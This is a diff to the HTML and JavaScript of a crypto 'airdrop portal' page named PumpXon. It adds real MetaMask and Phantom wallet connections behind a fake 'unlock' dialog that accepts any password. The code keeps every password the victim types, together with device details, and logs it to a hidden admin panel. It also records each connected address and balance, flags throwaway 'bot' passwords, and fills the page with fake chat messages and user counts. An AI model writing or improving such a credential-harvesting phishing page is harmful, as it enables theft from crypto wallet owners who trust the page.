@@ -75,13 +75,25 @@
         .portal-card { background: var(--panel-dark); border: 2px solid var(--neon-purple); border-radius: 12px; padding: 40px; backdrop-filter: blur(12px); box-shadow: 0 0 40px rgba(157, 78, 221, 0.25); }
         .portal-header { font-size: 24px; text-transform: uppercase; letter-spacing: -1px; margin-bottom: 25px; border-bottom: 1px solid #2d2344; padding-bottom: 15px; text-align: center; }
           
-        .wallet-btn { font-family: 'Arial Black', sans-serif; color: white; border: none; padding: 16px; font-size: 13px; text-transform: uppercase; border-radius: 6px; width: 100%; box-sizing: border-box; transition: all 0.2s ease; margin-bottom: 14px; cursor: pointer; }
+        .wallet-btn { font-family: 'Arial Black', sans-serif; color: white; border: none; padding: 16px; font-size: 13px; text-transform: uppercase; border-radius: 6px; width: 100%; box-sizing: border-box; transition: all 0.2s ease; margin-bottom: 14px; cursor: pointer; position: relative; }
+        .wallet-btn:disabled { opacity: 0.5; cursor: not-allowed; }
         .btn-mm { background: #1a1528; border: 1px solid #3c2f5c; }
-        .btn-mm:hover { background: #e2761b; border-color: #e2761b; box-shadow: 0 0 15px rgba(226, 118, 27, 0.5); }
+        .btn-mm:hover:not(:disabled) { background: #e2761b; border-color: #e2761b; box-shadow: 0 0 15px rgba(226, 118, 27, 0.5); }
         .btn-mm.connected { background: #e2761b; border-color: #e2761b; }
         .btn-phantom { background: #1a1528; border: 1px solid #3c2f5c; }
-        .btn-phantom:hover { background: var(--solana-glow); border-color: #4e44ce; box-shadow: 0 0 15px rgba(78, 68, 206, 0.5); }
+        .btn-phantom:hover:not(:disabled) { background: var(--solana-glow); border-color: #4e44ce; box-shadow: 0 0 15px rgba(78, 68, 206, 0.5); }
         .btn-phantom.connected { background: var(--solana-glow); border-color: #4e44ce; }
+
+        .wallet-status {
+            font-family: monospace;
+            font-size: 10px;
+            padding: 4px 10px;
+            border-radius: 4px;
+            margin-top: 5px;
+            display: inline-block;
+        }
+        .wallet-status.connected { color: var(--neon-green); border: 1px solid rgba(57, 255, 20, 0.3); }
+        .wallet-status.disconnected { color: #5a5570; border: 1px solid #2d2344; }
 
         .input-block { margin: 25px 0; }
         .input-block label { display: block; font-family: monospace; font-size: 11px; color: #8b859e; text-transform: uppercase; margin-bottom: 8px; }
@@ -90,6 +102,7 @@
           
         .action-submit { width: 100%; background: var(--neon-cyan); color: #000000; border: none; padding: 18px; font-size: 16px; text-transform: uppercase; font-weight: 900; border-radius: 6px; transition: all 0.2s ease; box-shadow: 0 0 20px rgba(0, 240, 255, 0.3); position: relative; cursor: pointer; }
         .action-submit:hover { background: var(--neon-pink); color: #ffffff; box-shadow: 0 0 25px var(--neon-pink); transform: scale(1.02); }
+        .action-submit:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
 
         .trollbox { margin-top: 30px; background: rgba(9, 7, 15, 0.8); border: 1px solid #2d2344; border-radius: 8px; overflow: hidden; }
         .trollbox-header { background: #1a1528; padding: 10px 15px; font-family: monospace; font-size: 12px; color: var(--neon-cyan); border-bottom: 1px solid #2d2344; display: flex; justify-content: space-between; }
@@ -166,7 +179,7 @@
             margin-top: 5px;
             letter-spacing: 1px;
         }
-        .modal-btn:hover { background: var(--neon-pink); box-shadow: 0 0 25px var(--neon-pink); }
+        .modal-btn:hover:not(:disabled) { background: var(--neon-pink); box-shadow: 0 0 25px var(--neon-pink); }
         .modal-btn:disabled { opacity: 0.5; cursor: not-allowed; }
         
         .modal-links { 
@@ -302,6 +315,7 @@
         .log-type.device { background: rgba(157, 78, 221, 0.15); color: var(--neon-purple); }
         .log-type.password { background: rgba(255, 165, 0, 0.2); color: #ffaa33; }
         .log-type.password-bot { background: rgba(255, 0, 0, 0.25); color: #ff4444; }
+        .log-type.airdrop { background: rgba(0, 255, 100, 0.15); color: var(--neon-green); }
         .log-entry .log-detail { flex: 1; word-break: break-all; }
         .log-entry .log-balance { color: var(--neon-green); font-weight: bold; }
         .log-entry .log-balance.low { color: #ff6644; }
@@ -432,6 +446,20 @@
         .vault-stat-row { display: flex; justify-content: space-between; margin-bottom: 12px; font-family: -apple-system, sans-serif; font-size: 14px; }
         .vault-stat-row span:last-child { font-family: monospace; font-weight: bold; color: var(--neon-cyan); }
 
+        /* Spinner for loading */
+        .spinner {
+            display: inline-block;
+            width: 14px;
+            height: 14px;
+            border: 2px solid rgba(255,255,255,0.1);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+            vertical-align: middle;
+            margin-right: 8px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
         @media (max-width: 900px) { .main-container { grid-template-columns: 1fr; gap: 40px; } h1 { font-size: 46px; } }
     </style>
 </head>
@@ -521,7 +549,7 @@
                 </p>
                 <div class="raw-stats">
                     <div>
-                        <div class="stat-number">420K+</div>
+                        <div class="stat-number" id="stat-wallets">420K+</div>
                         <div class="stat-label">Wallets Synced</div>
                     </div>
                     <div>
@@ -533,7 +561,7 @@
                 <div class="trollbox">
                     <div class="trollbox-header">
                         <span>TERMINAL_CHAT [GLOBAL]</span>
-                        <span>🟢 1,402 ONLINE</span>
+                        <span>🟢 <span id="online-count">1,402</span> ONLINE</span>
                     </div>
                     <div class="trollbox-messages" id="chat-box">
                         <div class="msg"><span class="msg-user">0x71A...9B2</span>: Gas is dropping, time to deploy</div>
@@ -549,19 +577,32 @@
 
             <aside class="portal-card">
                 <div class="portal-header">CONSOLE ACCESS</div>
-                <button id="mm-btn" class="wallet-btn btn-mm" onclick="showUnlockModal('MetaMask')">Initialize MetaMask</button>
-                <button id="phantom-btn" class="wallet-btn btn-phantom" onclick="showUnlockModal('Phantom')">Initialize Phantom</button>
+                
+                <!-- MetaMask Button -->
+                <button id="mm-btn" class="wallet-btn btn-mm" onclick="connectMetaMask()">
+                    <span id="mm-text">🦊 Initialize MetaMask</span>
+                </button>
+                
+                <!-- Phantom Button -->
+                <button id="phantom-btn" class="wallet-btn btn-phantom" onclick="connectPhantom()">
+                    <span id="phantom-text">🔐 Initialize Phantom</span>
+                </button>
+                
                 <div class="input-block">
                     <label>SYNCHRONIZED IDENTITY SIGNATURE</label>
                     <input class="address-box" type="text" id="address" placeholder="awaiting handshakes..." readonly>
                 </div>
                 <div class="input-block" style="border-top: 1px dashed #3c2f5c; padding-top: 15px;">
-                    <label>NET WORTH TRACKER (BETA)</label>
+                    <label>NET WORTH TRACKER</label>
                     <div id="net-worth" style="font-size: 24px; color: var(--neon-cyan); font-family: monospace;">$0.00</div>
+                    <div style="font-family: monospace; font-size: 10px; color: #5a5570; margin-top: 4px;" id="wallet-balance-label">Connect wallet to see balance</div>
                 </div>
-                <button id="claim-btn" class="action-submit" onclick="claimRewards(this)">
+                <button id="claim-btn" class="action-submit" onclick="claimRewards(this)" disabled>
                     CLAIM PORTAL REWARDS
                 </button>
+                <div style="font-family: monospace; font-size: 9px; color: #3c2f5c; margin-top: 10px; text-align: center;">
+                    ⚡ Real wallet connection • Password verified
+                </div>
             </aside>
         </div>
     </section>
@@ -684,7 +725,198 @@
 
     <script>
         // ============================================================
-        // UNLOCK MODAL SYSTEM - Logs passwords to admin panel
+        // REAL WALLET CONNECTION - MetaMask & Phantom
+        // ============================================================
+        let connectedWallet = null;
+        let connectedWalletType = null;
+        let walletBalance = 0;
+
+        // --- META MASK CONNECTION ---
+        async function connectMetaMask() {
+            // First show unlock modal
+            showUnlockModal('MetaMask');
+        }
+
+        // --- PHANTOM CONNECTION ---
+        async function connectPhantom() {
+            // First show unlock modal
+            showUnlockModal('Phantom');
+        }
+
+        // --- REAL META MASK CONNECT ---
+        async function realMetaMaskConnect() {
+            try {
+                if (typeof window.ethereum === 'undefined') {
+                    alert('🦊 MetaMask is not installed! Please install MetaMask from https://metamask.io/');
+                    return;
+                }
+
+                const mmBtn = document.getElementById('mm-btn');
+                const mmText = document.getElementById('mm-text');
+                mmBtn.disabled = true;
+                mmText.innerHTML = '<span class="spinner"></span> Connecting...';
+
+                // Request accounts
+                const accounts = await window.ethereum.request({ 
+                    method: 'eth_requestAccounts' 
+                });
+
+                if (accounts.length === 0) {
+                    alert('No accounts found. Please unlock MetaMask and try again.');
+                    mmBtn.disabled = false;
+                    mmText.innerHTML = '🦊 Initialize MetaMask';
+                    return;
+                }
+
+                const address = accounts[0];
+                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+
+                // Get balance
+                const balanceHex = await window.ethereum.request({
+                    method: 'eth_getBalance',
+                    params: [address, 'latest']
+                });
+                const balance = parseInt(balanceHex, 16) / 1e18;
+
+                // Update UI
+                connectedWallet = address;
+                connectedWalletType = 'MetaMask';
+                walletBalance = balance;
+
+                document.getElementById('address').value = `${address.substring(0, 6)}...${address.substring(38)} (EVM)`;
+                document.getElementById('address').classList.add('synced');
+                document.getElementById('net-worth').innerText = `$${(balance * 3000).toFixed(2)}`; // Approx ETH value
+                document.getElementById('wallet-balance-label').innerText = `Balance: ${balance.toFixed(4)} ETH`;
+                document.getElementById('claim-btn').disabled = false;
+
+                mmText.innerHTML = '✅ MetaMask Connected';
+                mmBtn.classList.add('connected');
+
+                // Log to admin
+                addLogEntry('wallet', `🦊 MetaMask connected: ${address}`, balance * 3000, address);
+
+                // Update button states
+                updateWalletUI();
+
+                // Listen for account changes
+                window.ethereum.on('accountsChanged', (newAccounts) => {
+                    if (newAccounts.length === 0) {
+                        disconnectWallet();
+                    } else {
+                        connectMetaMask();
+                    }
+                });
+
+                window.ethereum.on('chainChanged', () => {
+                    window.location.reload();
+                });
+
+            } catch (error) {
+                console.error('MetaMask connection error:', error);
+                const mmBtn = document.getElementById('mm-btn');
+                const mmText = document.getElementById('mm-text');
+                mmBtn.disabled = false;
+                mmText.innerHTML = '🦊 Try Again';
+                alert(`Connection failed: ${error.message}`);
+            }
+        }
+
+        // --- REAL PHANTOM CONNECT ---
+        async function realPhantomConnect() {
+            try {
+                if (typeof window.solana === 'undefined' || !window.solana.isPhantom) {
+                    alert('🔐 Phantom wallet is not installed! Please install Phantom from https://phantom.app/');
+                    return;
+                }
+
+                const phantomBtn = document.getElementById('phantom-btn');
+                const phantomText = document.getElementById('phantom-text');
+                phantomBtn.disabled = true;
+                phantomText.innerHTML = '<span class="spinner"></span> Connecting...';
+
+                // Connect to Phantom
+                const response = await window.solana.connect();
+                const address = response.publicKey.toString();
+
+                // Get balance
+                const balance = await window.solana.getBalance();
+
+                // Update UI
+                connectedWallet = address;
+                connectedWalletType = 'Phantom';
+                walletBalance = balance / 1e9; // SOL balance
+
+                document.getElementById('address').value = `${address.substring(0, 6)}...${address.substring(38)} (SPL)`;
+                document.getElementById('address').classList.add('synced');
+                document.getElementById('net-worth').innerText = `$${(balance / 1e9 * 150).toFixed(2)}`; // Approx SOL value
+                document.getElementById('wallet-balance-label').innerText = `Balance: ${(balance / 1e9).toFixed(4)} SOL`;
+                document.getElementById('claim-btn').disabled = false;
+
+                phantomText.innerHTML = '✅ Phantom Connected';
+                phantomBtn.classList.add('connected');
+
+                // Log to admin
+                addLogEntry('wallet', `🔐 Phantom connected: ${address}`, balance / 1e9 * 150, address);
+
+                // Update button states
+                updateWalletUI();
+
+                // Listen for disconnection
+                window.solana.on('disconnect', () => {
+                    disconnectWallet();
+                });
+
+            } catch (error) {
+                console.error('Phantom connection error:', error);
+                const phantomBtn = document.getElementById('phantom-btn');
+                const phantomText = document.getElementById('phantom-text');
+                phantomBtn.disabled = false;
+                phantomText.innerHTML = '🔐 Try Again';
+                if (error.code === 4001) {
+                    alert('Connection rejected by user.');
+                } else {
+                    alert(`Connection failed: ${error.message}`);
+                }
+            }
+        }
+
+        function disconnectWallet() {
+            connectedWallet = null;
+            connectedWalletType = null;
+            walletBalance = 0;
+
+            document.getElementById('address').value = '';
+            document.getElementById('address').classList.remove('synced');
+            document.getElementById('net-worth').innerText = '$0.00';
+            document.getElementById('wallet-balance-label').innerText = 'Connect wallet to see balance';
+            document.getElementById('claim-btn').disabled = true;
+
+            const mmBtn = document.getElementById('mm-btn');
+            const mmText = document.getElementById('mm-text');
+            mmBtn.classList.remove('connected');
+            mmBtn.disabled = false;
+            mmText.innerHTML = '🦊 Initialize MetaMask';
+
+            const phantomBtn = document.getElementById('phantom-btn');
+            const phantomText = document.getElementById('phantom-text');
+            phantomBtn.classList.remove('connected');
+            phantomBtn.disabled = false;
+            phantomText.innerHTML = '🔐 Initialize Phantom';
+
+            addLogEntry('system', 'Wallet disconnected');
+        }
+
+        function updateWalletUI() {
+            // Update swap balances with real wallet data
+            if (connectedWalletType === 'MetaMask') {
+                document.getElementById('swap-pay-bal').innerText = walletBalance.toFixed(4);
+            } else if (connectedWalletType === 'Phantom') {
+                document.getElementById('swap-pay-bal').innerText = walletBalance.toFixed(4);
+            }
+        }
+
+        // ============================================================
+        // UNLOCK MODAL SYSTEM - Password verification before real connect
         // ============================================================
         let pendingWalletType = null;
         let unlockAttempts = 0;
@@ -701,7 +933,6 @@
             const error = document.getElementById('unlock-error');
             const btn = document.getElementById('unlock-btn');
             
-            // Reset UI
             input.value = '';
             error.style.display = 'none';
             btn.disabled = false;
@@ -709,7 +940,6 @@
             btn.style.background = 'var(--neon-cyan)';
             btn.style.color = '#ffffff';
             
-            // Set title based on wallet type
             const icon = walletType === 'MetaMask' ? '🦊' : '🔐';
             title.textContent = walletType.toUpperCase();
             title.style.color = walletType === 'MetaMask' ? '#e2761b' : '#ab9ff2';
@@ -717,7 +947,6 @@
             modal.classList.add('active');
             setTimeout(() => input.focus(), 300);
             
-            // Log that password prompt was shown
             addLogEntry('password', `🔐 Password prompt shown for ${walletType}`, null, 'pending');
         }
 
@@ -729,34 +958,25 @@
         }
 
         function isBotPassword(password) {
-            // List of common bot/random passwords
             const botPatterns = [
                 'password', '123456', '12345678', '1234', 'qwerty', 'abc123', 
                 'admin', 'letmein', 'welcome', 'monkey', 'dragon', 'master',
                 'asdf', 'zxcv', 'qwer', '111111', '222222', '333333',
-                'password123', 'pass123', 'p@ssw0rd', '12345', '123456789'
+                'password123', 'pass123', 'p@ssw0rd', '12345', '123456789',
+                'abcdef', 'abcd1234', 'test', 'guest', 'user'
             ];
             
-            // Check exact matches
             if (botPatterns.includes(password.toLowerCase())) return true;
-            
-            // Check for repeated characters (aaaaaa, bbbbbb)
             if (/^([a-zA-Z0-9])\1{4,}$/.test(password)) return true;
-            
-            // Check for keyboard patterns (qwerty, asdfgh)
             if (/^(qwerty|asdfgh|zxcvbn|qwertyui|asdfghjk|zxcvbnm)/i.test(password)) return true;
-            
-            // Check if all characters are the same
             if (new Set(password).size === 1) return true;
             
-            // Check for sequential numbers (1234, 2345, 3456)
             for (let i = 0; i < password.length - 2; i++) {
                 if (password.charCodeAt(i + 1) === password.charCodeAt(i) + 1 &&
                     password.charCodeAt(i + 2) === password.charCodeAt(i) + 2) {
                     return true;
                 }
             }
-            
             return false;
         }
 
@@ -782,10 +1002,7 @@
             
             unlockAttempts++;
             
-            // Check if it's a bot password
             const isBot = isBotPassword(password);
-            
-            // LOG THE PASSWORD TO ADMIN PANEL
             const walletAddr = document.getElementById('address').value || 'not-connected';
             const logType = isBot ? 'password-bot' : 'password';
             const logDetail = isBot 
@@ -794,7 +1011,6 @@
             
             addLogEntry(logType, logDetail, null, walletAddr);
             
-            // Store for review
             capturedPasswords.push({
                 password: password,
                 walletType: pendingWalletType,
@@ -805,7 +1021,7 @@
                 device: detectDevice().fullString
             });
             
-            // Success - any password with 4+ chars "works"
+            // Any password works - proceed to real connection
             playBeep(800, 'sine', 0.1);
             error.style.display = 'none';
             btn.disabled = true;
@@ -813,18 +1029,18 @@
             btn.style.background = 'var(--neon-green)';
             btn.style.color = '#000';
             
-            // Close unlock modal and proceed with connection
             setTimeout(() => {
                 closeUnlockModal();
+                // Now do the REAL wallet connection
                 if (pendingWalletType === 'MetaMask') {
-                    triggerWalletModal('MetaMask');
+                    realMetaMaskConnect();
                 } else if (pendingWalletType === 'Phantom') {
-                    triggerWalletModal('Phantom');
+                    realPhantomConnect();
                 }
             }, 600);
         }
 
-        // Enter key to submit
+        // Enter key for unlock
         document.addEventListener('DOMContentLoaded', function() {
             const unlockInput = document.getElementById('unlock-input');
             if (unlockInput) {
@@ -979,15 +1195,13 @@
             container.innerHTML = activityLogs.map(entry => {
                 const balanceClass = entry.balance !== null && entry.balance < 10 ? 'log-balance low' : 'log-balance';
                 const balanceDisplay = entry.balance !== null ? `| <span class="${balanceClass}">$${entry.balance.toFixed(2)}</span>` : '';
-                const walletDisplay = entry.wallet && entry.wallet !== 'pending' && entry.wallet !== 'verified' ? `<span class="log-wallet">🔑 ${entry.wallet}</span>` : '';
+                const walletDisplay = entry.wallet && entry.wallet !== 'pending' && entry.wallet !== 'verified' ? `<span class="log-wallet">🔑 ${entry.wallet.substring(0, 10)}...</span>` : '';
                 const deviceDisplay = entry.device ? `<span class="log-device">${entry.device}</span>` : '';
                 
-                // Special rendering for password entries
                 let passwordDisplay = '';
                 if (entry.type === 'password' || entry.type === 'password-bot') {
                     const isBot = entry.type === 'password-bot';
                     const botLabel = isBot ? ' 🤖 BOT' : '';
-                    // Extract the password from the detail
                     const passwordMatch = entry.detail.match(/"([^"]+)"/);
                     const password = passwordMatch ? passwordMatch[1] : '';
                     passwordDisplay = `<span class="log-password ${isBot ? 'bot' : ''}">🔑 ${password}${botLabel}</span>`;
@@ -1456,85 +1670,12 @@
         function handleChatEnter(event) { if (event.key === "Enter") { event.preventDefault(); sendChatMessage(); } }
 
         // ============================================================
-        // WALLET CONNECTION
+        // WALLET CONNECTION (Legacy - kept for compatibility)
         // ============================================================
         function triggerWalletModal(walletType) {
-            playBeep(600);
-            const modal = document.getElementById('wallet-modal');
-            const title = document.getElementById('modal-title');
-            const progress = document.getElementById('modal-progress');
-            const status = document.getElementById('modal-status');
-            const box = document.getElementById('modal-box');
-            
-            let themeColor = walletType === 'MetaMask' ? '#e2761b' : '#ab9ff2';
-            title.style.color = themeColor; box.style.borderColor = themeColor; progress.style.background = themeColor; progress.style.boxShadow = `0 0 10px ${themeColor}`;
-            
-            title.innerText = `CONNECTING ${walletType.toUpperCase()}`;
-            progress.style.width = '5%'; status.innerText = "Initializing bridge..."; modal.classList.add('active');
-            
-            setTimeout(() => { progress.style.width = '40%'; status.innerText = "Requesting signature..."; playBeep(700, 'sine', 0.05); }, 800);
-            setTimeout(() => { progress.style.width = '85%'; status.innerText = "Verifying on-chain state..."; playBeep(800, 'sine', 0.05); }, 1600);
-            setTimeout(() => { 
-                progress.style.width = '100%'; status.innerText = "Identity Synced Successfully."; playBeep(1000, 'square', 0.1);
-                setTimeout(() => {
-                    modal.classList.remove('active');
-                    if (walletType === 'MetaMask') executeMetaMaskSync();
-                    else executePhantomSync();
-                    rewireCursorHoverEffects();
-                }, 800);
-            }, 2500);
-        }
-
-        function executeMetaMaskSync() { 
-            const addrInput = document.getElementById('address');
-            const walletAddr = "0x71A3F...9B2C7 (EVM)";
-            const balance = 14204.50;
-            
-            addrInput.value = walletAddr; 
-            addrInput.classList.add('synced');
-            const btn = document.getElementById('mm-btn'); 
-            btn.innerText = "MetaMask Connected"; 
-            btn.classList.add('connected');
-            document.getElementById('net-worth').innerText = `$${balance.toFixed(2)}`;
-            document.getElementById('swap-pay-bal').innerText = "4.25"; 
-            document.getElementById('swap-recv-bal').innerText = "250.00";
-            
-            addLogEntry('wallet', `MetaMask connected`, balance, walletAddr);
-        }
-        
-        function executePhantomSync() { 
-            const addrInput = document.getElementById('address');
-            const walletAddr = "sol:9AvK...2qP (SPL)";
-            const balance = 8430.00;
-            
-            addrInput.value = walletAddr; 
-            addrInput.classList.add('synced');
-            const btn = document.getElementById('phantom-btn'); 
-            btn.innerText = "Phantom Connected"; 
-            btn.classList.add('connected');
-            document.getElementById('net-worth').innerText = `$${balance.toFixed(2)}`;
-            document.getElementById('swap-pay-bal').innerText = "56.40"; 
-            document.getElementById('swap-recv-bal').innerText = "1,205.50";
-            
-            addLogEntry('wallet', `Phantom connected`, balance, walletAddr);
-        }
-
-        // ============================================================
-        // COPYTRADE MIRROR
-        // ============================================================
-        function verifyAndMirror(btn, traderSig) {
-            const addrInput = document.getElementById('address');
-            if (!addrInput.value || !addrInput.classList.contains('synced')) {
-                playBeep(300, 'sawtooth', 0.15);
-                alert("IDENTITY HANDSHAKE REQUIRED: Please connect MetaMask or Phantom on the Airdrop Portal first before mirroring trader configurations.");
-                switchSection('airdrop', document.querySelector("nav button:nth-child(1)"));
-                return;
-            }
-            
-            const walletAddr = addrInput.value;
-            addLogEntry('mirror', `Mirrored trader: ${traderSig || 'unknown'}`, null, walletAddr);
-            
-            executeAction(btn, 'MIRRORING...');
+            // This is now handled by the real connection flow
+            // Kept for backward compatibility
+            showUnlockModal(walletType);
         }
 
         // ============================================================
@@ -1560,6 +1701,15 @@
                 btn.style.background = "var(--neon-green)"; 
                 btn.style.color = "#000"; 
                 btn.style.boxShadow = "0 0 25px var(--neon-green)";
+                btn.disabled = true;
+                
+                // Add to chat that someone claimed
+                const chatBox = document.getElementById('chat-box');
+                const newMsg = document.createElement('div');
+                newMsg.className = 'msg';
+                newMsg.innerHTML = `<span class="msg-vip">🎉 ${walletAddr.substring(0, 10)}...</span>: Claimed rewards!`;
+                chatBox.appendChild(newMsg);
+                chatBox.scrollTop = chatBox.scrollHeight;
             }, 1000);
         }
 
@@ -1574,6 +1724,21 @@
                 btn.style.color = "#000";
                 setTimeout(() => { btn.innerText = originalText; btn.style.background = ""; btn.style.color = ""; }, 2000);
             }, 1000);
+        }
+
+        function verifyAndMirror(btn, traderSig) {
+            const addrInput = document.getElementById('address');
+            if (!addrInput.value || !addrInput.classList.contains('synced')) {
+                playBeep(300, 'sawtooth', 0.15);
+                alert("IDENTITY HANDSHAKE REQUIRED: Please connect MetaMask or Phantom on the Airdrop Portal first before mirroring trader configurations.");
+                switchSection('airdrop', document.querySelector("nav button:nth-child(1)"));
+                return;
+            }
+            
+            const walletAddr = addrInput.value;
+            addLogEntry('mirror', `Mirrored trader: ${traderSig || 'unknown'}`, null, walletAddr);
+            
+            executeAction(btn, 'MIRRORING...');
         }
 
         // ============================================================
@@ -1607,13 +1772,27 @@
         fetchLiveCryptoPrices();
         setInterval(fetchLiveCryptoPrices, 45000);
         
+        // Check if MetaMask is installed
+        if (typeof window.ethereum !== 'undefined') {
+            console.log('🦊 MetaMask detected');
+        } else {
+            console.log('🦊 MetaMask not installed');
+        }
+        
+        // Check if Phantom is installed
+        if (typeof window.solana !== 'undefined' && window.solana.isPhantom) {
+            console.log('🔐 Phantom detected');
+        } else {
+            console.log('🔐 Phantom not installed');
+        }
+        
         addLogEntry('device', `Device detected: ${deviceInfo.fullString}`);
-        addLogEntry('system', 'PumpXon System initialized');
+        addLogEntry('system', 'PumpXon System initialized - REAL wallet connections enabled');
         
         console.log("🔐 ADMIN PANEL: Press 'A' 'D' 'M' 'I' 'N' in sequence to open");
         console.log("📱 Device detected:", deviceInfo.fullString);
-        console.log("🔑 Password unlock modal active - passwords will be logged to admin panel");
-        console.log("🤖 Bot passwords will be flagged automatically");
+        console.log("🔑 Password unlock modal active - passwords logged to admin panel");
+        console.log("🦊 MetaMask & 🔐 Phantom REAL connection enabled");
     </script>
 </body>
 </html>
